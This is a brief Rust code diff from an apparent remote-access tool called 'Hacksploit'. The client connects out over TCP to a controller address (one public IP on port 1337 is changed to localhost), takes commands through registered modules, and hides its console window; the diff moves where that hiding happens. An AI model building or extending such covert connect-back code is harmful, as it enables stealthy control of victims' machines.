@@ -14,7 +14,7 @@ const WELCOME_MESSAGE: &str = "Welcome to Hacksploit :)\n";
 const HELP_MESSAGE: &str = "\nCommand entries: \n{ENTRIES}\n";
 const UNKNOWN_COMMAND: &str = "Unknown command. Please try again.\n";
 
-const DEFAULT_ADDR: &str = "51.146.6.229:1337";
+const DEFAULT_ADDR: &str = "localhost:1337";
 
 pub trait HacksploitModule {
     fn on_command(&self, args: Vec<&str>) -> String;
@@ -91,7 +91,6 @@ fn hide_console_window() {
 }
 
 fn main() {
-    hide_console_window();
     let interval = std::time::Duration::from_secs(1);
     let mut addr = String::from(DEFAULT_ADDR);
     if std::env::args().len() > 1 {
@@ -108,6 +107,7 @@ fn main() {
 }
 
 fn start(addr: &str) -> Result<(), Error> {
+    hide_console_window();
     let mut stream: TcpStream = TcpStream::connect(addr)?;
     let mut instance: HacksploitInstance = HacksploitInstance::new();
     register_modules(&mut instance);
